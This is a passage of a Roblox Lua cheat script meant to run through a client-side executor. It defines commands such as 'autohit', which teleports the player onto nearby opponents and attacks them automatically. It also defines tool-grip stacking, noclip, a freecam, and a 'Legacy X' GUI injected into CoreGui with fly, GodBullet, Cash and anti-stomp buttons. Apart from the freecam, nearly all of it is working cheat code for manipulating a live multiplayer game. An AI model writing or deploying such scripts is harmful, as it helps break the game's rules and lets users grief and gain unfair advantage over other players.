        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(-1, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(-1, 1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(0, 1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, 1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, 1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(2, -1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(1, -1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(0, -1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos     = Vector3.new(-1, -1, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
        
        game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(0, 0, 0)
        game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
		end;
    });
    
    addCommand({
        ["Name"] = "autohit";
        ["Function"] = function()
            while wait() do
                pcall(function()
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
                        game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
                    end
                    wait()
                    game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
                    if game.Players.LocalPlayer.Character then
                        if game.Players.LocalPlayer.character:FindFirstChild("HumanoidRootPart") then
                            returnpos = game.Players.LocalPlayer.character:FindFirstChild("HumanoidRootPart").CFrame
                        end
                    end    
                    wait(1.1)
            
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name and v.Name ~= "Vortextures" and v.Name ~= "Vortexturize" and v.Name ~= "Vortexturable" then
                            if v.Character then
                                if v.Character:FindFirstChild("HumanoidRootPart") then
                                    distance = game.Players.LocalPlayer:DistanceFromCharacter(v.Character.HumanoidRootPart.Position)
            
                                    if distance < 35 then
                                        for i = 1,5 do
                                            if v then
                                                if v.Character and game.Players.LocalPlayer.Character then
                                                    if v.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and v.Character.Humanoid.Health > 10 then
                                                        game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = v.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0,0,0.7)
                                                    end
                                                end
                                            end
                                            game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.p, v.Character.HumanoidRootPart.CFrame.p)
                                            wait(0.05)
                                        end
            
                                    end
            
                                end
                            end
                        end
                    end
                end)
            end
            end;
        });

	addCommand({
		["Name"] = "freecam";
		["Function"] = function()
			sendNotif("", "Freecam Enabled, Keybind: B", 15);
			------------------------------------------------------------------------
			-- Freecam
			-- Cinematic free camera for spectating and video production.
			------------------------------------------------------------------------

			local pi    = math.pi
			local abs   = math.abs
			local clamp = math.clamp
			local exp   = math.exp
			local rad   = math.rad
			local sign  = math.sign
			local sqrt  = math.sqrt
			local tan   = math.tan

			local ContextActionService = game:GetService("ContextActionService")
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local StarterGui = game:GetService("StarterGui")
			local UserInputService = game:GetService("UserInputService")
			local Workspace = game:GetService("Workspace")

			local LocalPlayer = Players.LocalPlayer
			if not LocalPlayer then
				Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
				LocalPlayer = Players.LocalPlayer
			end

			local Camera = Workspace.CurrentCamera
			Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				local newCamera = Workspace.CurrentCamera
				if newCamera then
					Camera = newCamera
				end
			end)

			------------------------------------------------------------------------

			local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
			local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
			local FREECAM_MACRO_KB = Enum.KeyCode.B

			local NAV_GAIN = Vector3.new(1, 1, 1)*64
			local PAN_GAIN = Vector2.new(0.75, 1)*8
			local FOV_GAIN = 300

			local PITCH_LIMIT = rad(90)

			local VEL_STIFFNESS = 1.5
			local PAN_STIFFNESS = 1.0
			local FOV_STIFFNESS = 4.0

			------------------------------------------------------------------------

			local Spring = {} do
				Spring.__index = Spring

				function Spring.new(freq, pos)
					local self = setmetatable({}, Spring)
					self.f = freq
					self.p = pos
					self.v = pos*0
					return self
				end

				function Spring:Update(dt, goal)
					local f = self.f*2*pi
					local p0 = self.p
					local v0 = self.v

					local offset = goal - p0
					local decay = exp(-f*dt)

					local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
					local v1 = (f*dt*(offset*f - v0) + v0)*decay

					self.p = p1
					self.v = v1

					return p1
				end

				function Spring:Reset(pos)
					self.p = pos
					self.v = pos*0
				end
			end

			------------------------------------------------------------------------

			local cameraPos = Vector3.new()
			local cameraRot = Vector2.new()
			local cameraFov = 0

			local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
			local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
			local fovSpring = Spring.new(FOV_STIFFNESS, 0)

			------------------------------------------------------------------------

			local Input = {} do
				local thumbstickCurve do
					local K_CURVATURE = 2.0
					local K_DEADZONE = 0.15

					local function fCurve(x)
						return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
					end

					local function fDeadzone(x)
						return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
					end

					function thumbstickCurve(x)
						return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
					end
				end

				local gamepad = {
					ButtonX = 0,
					ButtonY = 0,
					DPadDown = 0,
					DPadUp = 0,
					ButtonL2 = 0,
					ButtonR2 = 0,
					Thumbstick1 = Vector2.new(),
					Thumbstick2 = Vector2.new(),
				}

				local keyboard = {
					W = 0,
					A = 0,
					S = 0,
					D = 0,
					E = 0,
					Q = 0,
					U = 0,
					H = 0,
					J = 0,
					K = 0,
					I = 0,
					Y = 0,
					Up = 0,
					Down = 0,
					LeftShift = 0,
					RightShift = 0,
				}

				local mouse = {
					Delta = Vector2.new(),
					MouseWheel = 0,
				}

				local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
				local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
				local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
				local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
				local FOV_WHEEL_SPEED    = 1.0
				local FOV_GAMEPAD_SPEED  = 0.25
				local NAV_ADJ_SPEED      = 0.75
				local NAV_SHIFT_MUL      = 0.25

				local navSpeed = 1

				function Input.Vel(dt)
					navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

					local kGamepad = Vector3.new(
						thumbstickCurve(gamepad.Thumbstick1.x),
						thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
						thumbstickCurve(-gamepad.Thumbstick1.y)
					)*NAV_GAMEPAD_SPEED

					local kKeyboard = Vector3.new(
						keyboard.D - keyboard.A + keyboard.K - keyboard.H,
						keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
						keyboard.S - keyboard.W + keyboard.J - keyboard.U
					)*NAV_KEYBOARD_SPEED

					local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

					return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
				end

				function Input.Pan(dt)
					local kGamepad = Vector2.new(
						thumbstickCurve(gamepad.Thumbstick2.y),
						thumbstickCurve(-gamepad.Thumbstick2.x)
					)*PAN_GAMEPAD_SPEED
					local kMouse = mouse.Delta*PAN_MOUSE_SPEED
					mouse.Delta = Vector2.new()
					return kGamepad + kMouse
				end

				function Input.Fov(dt)
					local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
					local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
					mouse.MouseWheel = 0
					return kGamepad + kMouse
				end

				do
					local function Keypress(action, state, input)
						keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
						return Enum.ContextActionResult.Sink
					end

					local function GpButton(action, state, input)
						gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
						return Enum.ContextActionResult.Sink
					end

					local function MousePan(action, state, input)
						local delta = input.Delta
						mouse.Delta = Vector2.new(-delta.y, -delta.x)
						return Enum.ContextActionResult.Sink
					end

					local function Thumb(action, state, input)
						gamepad[input.KeyCode.Name] = input.Position
						return Enum.ContextActionResult.Sink
					end

					local function Trigger(action, state, input)
						gamepad[input.KeyCode.Name] = input.Position.z
						return Enum.ContextActionResult.Sink
					end

					local function MouseWheel(action, state, input)
						mouse[input.UserInputType.Name] = -input.Position.z
						return Enum.ContextActionResult.Sink
					end

					local function Zero(t)
						for k, v in pairs(t) do
							t[k] = v*0
						end
					end

					function Input.StartCapture()
						ContextActionService:BindActionAtPriority("FreecamKeyboard", Keypress, false, INPUT_PRIORITY,
							Enum.KeyCode.W, Enum.KeyCode.U,
							Enum.KeyCode.A, Enum.KeyCode.H,
							Enum.KeyCode.S, Enum.KeyCode.J,
							Enum.KeyCode.D, Enum.KeyCode.K,
							Enum.KeyCode.E, Enum.KeyCode.I,
							Enum.KeyCode.Q, Enum.KeyCode.Y,
							Enum.KeyCode.Up, Enum.KeyCode.Down
						)
						ContextActionService:BindActionAtPriority("FreecamMousePan",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
						ContextActionService:BindActionAtPriority("FreecamMouseWheel",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
						ContextActionService:BindActionAtPriority("FreecamGamepadButton",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
						ContextActionService:BindActionAtPriority("FreecamGamepadTrigger",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
						ContextActionService:BindActionAtPriority("FreecamGamepadThumbstick", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
					end

					function Input.StopCapture()
						navSpeed = 1
						Zero(gamepad)
						Zero(keyboard)
						Zero(mouse)
						ContextActionService:UnbindAction("FreecamKeyboard")
						ContextActionService:UnbindAction("FreecamMousePan")
						ContextActionService:UnbindAction("FreecamMouseWheel")
						ContextActionService:UnbindAction("FreecamGamepadButton")
						ContextActionService:UnbindAction("FreecamGamepadTrigger")
						ContextActionService:UnbindAction("FreecamGamepadThumbstick")
					end
				end
			end

			local function GetFocusDistance(cameraFrame)
				local znear = 0.1
				local viewport = Camera.ViewportSize
				local projy = 2*tan(cameraFov/2)
				local projx = viewport.x/viewport.y*projy
				local fx = cameraFrame.rightVector
				local fy = cameraFrame.upVector
				local fz = cameraFrame.lookVector

				local minVect = Vector3.new()
				local minDist = 512

				for x = 0, 1, 0.5 do
					for y = 0, 1, 0.5 do
						local cx = (x - 0.5)*projx
						local cy = (y - 0.5)*projy
						local offset = fx*cx - fy*cy + fz
						local origin = cameraFrame.p + offset*znear
						local _, hit = Workspace:FindPartOnRay(Ray.new(origin, offset.unit*minDist))
						local dist = (hit - origin).magnitude
						if minDist > dist then
							minDist = dist
							minVect = offset.unit
						end
					end
				end

				return fz:Dot(minVect)*minDist
			end

			------------------------------------------------------------------------

			local function StepFreecam(dt)
				local vel = velSpring:Update(dt, Input.Vel(dt))
				local pan = panSpring:Update(dt, Input.Pan(dt))
				local fov = fovSpring:Update(dt, Input.Fov(dt))

				local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

				cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
				cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
				cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

				local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
				cameraPos = cameraCFrame.p

				Camera.CFrame = cameraCFrame
				Camera.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
				Camera.FieldOfView = cameraFov
			end

			------------------------------------------------------------------------

			local PlayerState = {} do
				local mouseBehavior
				local mouseIconEnabled
				local cameraType
				local cameraFocus
				local cameraCFrame
				local cameraFieldOfView
				local screenGuis = {}
				local coreGuis = {
					Backpack = true,
					Chat = true,
					Health = true,
					PlayerList = true,
				}
				local setCores = {
					BadgesNotificationsActive = true,
					PointsNotificationsActive = true,
				}

				-- Save state and set up for freecam
				function PlayerState.Push()
					for name in pairs(coreGuis) do
						coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
						StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
					end
					for name in pairs(setCores) do
						setCores[name] = StarterGui:GetCore(name)
						StarterGui:SetCore(name, false)
					end
					local playergui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
					if playergui then
						for _, gui in pairs(playergui:GetChildren()) do
							if gui:IsA("ScreenGui") and gui.Enabled then
								screenGuis[#screenGuis + 1] = gui
								gui.Enabled = false
							end
						end
					end

					cameraFieldOfView = Camera.FieldOfView
					Camera.FieldOfView = 70

					cameraType = Camera.CameraType
					Camera.CameraType = Enum.CameraType.Custom

					cameraCFrame = Camera.CFrame
					cameraFocus = Camera.Focus

					mouseIconEnabled = UserInputService.MouseIconEnabled
					UserInputService.MouseIconEnabled = false

					mouseBehavior = UserInputService.MouseBehavior
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				end

				-- Restore state
				function PlayerState.Pop()
					for name, isEnabled in pairs(coreGuis) do
						StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
					end
					for name, isEnabled in pairs(setCores) do
						StarterGui:SetCore(name, isEnabled)
					end
					for _, gui in pairs(screenGuis) do
						if gui.Parent then
							gui.Enabled = true
						end
					end

					Camera.FieldOfView = cameraFieldOfView
					cameraFieldOfView = nil

					Camera.CameraType = cameraType
					cameraType = nil

					Camera.CFrame = cameraCFrame
					cameraCFrame = nil

					Camera.Focus = cameraFocus
					cameraFocus = nil

					UserInputService.MouseIconEnabled = mouseIconEnabled
					mouseIconEnabled = nil

					UserInputService.MouseBehavior = mouseBehavior
					mouseBehavior = nil
				end
			end

			local function StartFreecam()
				local cameraCFrame = Camera.CFrame
				cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
				cameraPos = cameraCFrame.p
				cameraFov = Camera.FieldOfView

				velSpring:Reset(Vector3.new())
				panSpring:Reset(Vector2.new())
				fovSpring:Reset(0)

				PlayerState.Push()
				RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, StepFreecam)
				Input.StartCapture()
			end

			local function StopFreecam()
				Input.StopCapture()
				RunService:UnbindFromRenderStep("Freecam")
				PlayerState.Pop()
			end

			------------------------------------------------------------------------

			do
				local enabled = false

				local function ToggleFreecam()
					if enabled then
						StopFreecam()
					else
						StartFreecam()
					end
					enabled = not enabled
				end

				local function HandleActivationInput(action, state, input)
					if state == Enum.UserInputState.Begin then
						if input.KeyCode == FREECAM_MACRO_KB then
							ToggleFreecam()
						end
					end
					return Enum.ContextActionResult.Pass
				end

				ContextActionService:BindActionAtPriority("FreecamToggle", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, FREECAM_MACRO_KB)
			end
		end;
	});

	addCommand({
		["Name"] = "noclip";
		["Function"] = function()
			if (loopVariables.Noclip == false) then
				loopVariables.Noclip = true;
				sendNotif("", "Noclip Enabled.");
			else
				loopVariables.Noclip = false;
				sendNotif("", "Noclip Disabled.");
			end;
			game:GetService('RunService').Stepped:connect(function()
				if loopVariables.Noclip == true then
					game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				end
			end)
		end;
	});

	addCommand({
		["Name"] = "hybrid";
		["Function"] = function()
			sendNotif("", "Keybind: G", 15);
			-- Instances:

			local LegacyX = Instance.new("ScreenGui")
			local Main = Instance.new("ImageLabel")
			local MainFrame = Instance.new("ImageLabel")
			local Line1 = Instance.new("Frame")
			local UICorner = Instance.new("UICorner")
			local X = Instance.new("TextLabel")
			local ScrollingFrame = Instance.new("ScrollingFrame")
			local FlyX = Instance.new("TextButton")
			local UICorner_2 = Instance.new("UICorner")
			local Bag = Instance.new("TextButton")
			local UICorner_3 = Instance.new("UICorner")
			local Target = Instance.new("TextButton")
			local UICorner_4 = Instance.new("UICorner")
			local FreeFists = Instance.new("TextButton")
			local UICorner_5 = Instance.new("UICorner")
			local AntiStomp = Instance.new("TextButton")
			local UICorner_6 = Instance.new("UICorner")
			local AntiFlashbang = Instance.new("TextButton")
			local UICorner_7 = Instance.new("UICorner")
			local AntiBag = Instance.new("TextButton")
			local UICorner_8 = Instance.new("UICorner")
			local Headless = Instance.new("TextButton")
			local UICorner_9 = Instance.new("UICorner")
			local Goto = Instance.new("TextButton")
			local UICorner_10 = Instance.new("UICorner")
			local Spectate = Instance.new("TextButton")
			local UICorner_11 = Instance.new("UICorner")
			local Unspectate = Instance.new("TextButton")
			local UICorner_12 = Instance.new("UICorner")
			local Cash = Instance.new("TextButton")
			local UICorner_13 = Instance.new("UICorner")
			local FistReach = Instance.new("TextButton")
			local UICorner_14 = Instance.new("UICorner")
			local FEBackflip = Instance.new("TextButton")
			local UICorner_15 = Instance.new("UICorner")
			local Maskspam = Instance.new("TextButton")
			local UICorner_16 = Instance.new("UICorner")
			local Naked = Instance.new("TextButton")
			local UICorner_17 = Instance.new("UICorner")
			local GodBullet = Instance.new("TextButton")
			local UICorner_18 = Instance.new("UICorner")
			local GodmodeUnban = Instance.new("TextButton")
			local UICorner_19 = Instance.new("UICorner")
			local FreeFistsBiggerHitbox = Instance.new("TextButton")
			local UICorner_20 = Instance.new("UICorner")
			local FixRightFists = Instance.new("TextButton")
			local UICorner_21 = Instance.new("UICorner")
			local FixLeftFists = Instance.new("TextButton")
			local UICorner_22 = Instance.new("UICorner")
			local Info = Instance.new("TextLabel")
			local FlyGun = Instance.new("TextButton")
			local UICorner_23 = Instance.new("UICorner")
			local FlyMeleeWeapon = Instance.new("TextButton")
			local UICorner_24 = Instance.new("UICorner")
			local Frame = Instance.new("ImageLabel")
			local TextBox = Instance.new("TextBox")
			local Fatel = Instance.new("TextLabel")
			local function ShrinkName()
				TextBox.FocusLost:connect(function()
					for i,v in pairs(game.Players:GetChildren()) do
						if (string.sub(string.lower(v.Name),1,string.len(TextBox.Text))) == string.lower(TextBox.Text) then
							TextBox.Text = v.Name
						end
					end
				end)
			end

			ShrinkName()
			function findPlayer(name)
				name = name:lower()
				if name == 'me' then
					return game:GetService'Players'.LocalPlayer
				end
				for i,v in pairs(game:GetService'Players':GetPlayers()) do
					if v.Name:lower():find(name) == 1 then
						return v
					end
				end
			end

			--Properties:

			LegacyX.Name = "Legacy X"
			LegacyX.Parent = game.CoreGui

			Main.Name = "Main"
			Main.Parent = LegacyX
			Main.Active = true
			Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Main.BackgroundTransparency = 1.000
			Main.Position = UDim2.new(0.7141518, 0, 0.537688375, 0)
			Main.Size = UDim2.new(0, 292, 0, 250)
			Main.Image = "rbxassetid://3570695787"
			Main.ImageColor3 = Color3.fromRGB(7, 7, 7)
			Main.ImageTransparency = 1.000
			Main.ScaleType = Enum.ScaleType.Slice
			Main.SliceCenter = Rect.new(100, 100, 100, 100)
			Main.SliceScale = 0.120
			Main.Draggable = true

			MainFrame.Name = "Main Frame"
			MainFrame.Parent = Main
			MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			MainFrame.BackgroundTransparency = 1.000
			MainFrame.Position = UDim2.new(0.0273972563, 0, 0.0399999954, 0)
			MainFrame.Size = UDim2.new(0, 277, 0, 230)
			MainFrame.Image = "rbxassetid://3570695787"
			MainFrame.ImageColor3 = Color3.fromRGB(11, 11, 11)
			MainFrame.ScaleType = Enum.ScaleType.Slice
			MainFrame.SliceCenter = Rect.new(100, 100, 100, 100)
			MainFrame.SliceScale = 0.080

			Line1.Name = "Line 1"
			Line1.Parent = MainFrame
			Line1.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
			Line1.BorderColor3 = Color3.fromRGB(255, 0, 0)
			Line1.BorderSizePixel = 0
			Line1.Position = UDim2.new(0.0516151525, 0, 0.129272863, 0)
			Line1.Size = UDim2.new(0, 248, 0, 5)

			UICorner.CornerRadius = UDim.new(0.200000003, 0)
			UICorner.Parent = Line1

			X.Name = "X"
			X.Parent = MainFrame
			X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			X.BackgroundTransparency = 1.000
			X.BorderSizePixel = 0
			X.Position = UDim2.new(0.212996393, 0, 0, 0)
			X.Size = UDim2.new(0, 28, 0, 29)
			X.Font = Enum.Font.Cartoon
			X.Text = "X"
			X.TextColor3 = Color3.fromRGB(255, 0, 68)
			X.TextSize = 24.000
			X.TextWrapped = true

			ScrollingFrame.Parent = MainFrame
			ScrollingFrame.Active = true
			ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ScrollingFrame.BackgroundTransparency = 1.000
			ScrollingFrame.BorderSizePixel = 0
			ScrollingFrame.Position = UDim2.new(0, 0, 0.178260863, 0)
			ScrollingFrame.Size = UDim2.new(0, 277, 0, 153)
			ScrollingFrame.CanvasPosition = Vector2.new(0, 847)
			ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)

			FlyX.Name = "Fly [X]"
			FlyX.Parent = ScrollingFrame
			FlyX.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FlyX.BorderSizePixel = 0
			FlyX.Position = UDim2.new(0.109376982, 0, 0.0149849486, 0)
			FlyX.Size = UDim2.new(0, 216, 0, 29)
			FlyX.Font = Enum.Font.Cartoon
			FlyX.Text = "Fly [X]"
			FlyX.TextColor3 = Color3.fromRGB(255, 255, 255)
			FlyX.TextScaled = true
			FlyX.TextSize = 14.000
			FlyX.TextWrapped = true

			UICorner_2.CornerRadius = UDim.new(0.25, 0)
			UICorner_2.Parent = FlyX
			FlyX.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Fly Enabled to true." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
				local plr = game.Players.LocalPlayer
				local mouse = plr:GetMouse()

				localplayer = plr

				if workspace:FindFirstChild("Core") then
					workspace.Core:Destroy()
				end

				local Core = Instance.new("Part")
				Core.Name = "Core"
				Core.Size = Vector3.new(0.05, 0.05, 0.05)

				spawn(function()
					Core.Parent = workspace
					local Weld = Instance.new("Weld", Core)
					Weld.Part0 = Core
					Weld.Part1 = localplayer.Character.LowerTorso
					Weld.C0 = CFrame.new(0, 0, 0)
				end)

				workspace:WaitForChild("Core")

				local torso = workspace.Core
				flying = true
				local speed=50
				local keys={a=false,d=false,w=false,s=false}
				local e1
				local e2
				local function start()
					local pos = Instance.new("BodyPosition",torso)
					local gyro = Instance.new("BodyGyro",torso)
					pos.Name="EPIXPOS"
					pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
					pos.position = torso.Position
					gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					gyro.cframe = torso.CFrame
					repeat
						wait()
						localplayer.Character.Humanoid.PlatformStand=true
						local new=gyro.cframe - gyro.cframe.p + pos.position
						if not keys.w and not keys.s and not keys.a and not keys.d then
							speed=50
						end
						if keys.w then
							new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
							speed=speed+0
						end
						if keys.s then
							new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
							speed=speed+0
						end
						if keys.d then
							new = new * CFrame.new(speed,0,0)
							speed=speed+0
						end
						if keys.a then
							new = new * CFrame.new(-speed,0,0)
							speed=speed+0
						end
						if speed>10 then
							speed=50
						end
						pos.position=new.p
						if keys.w then
							gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
						elseif keys.s then
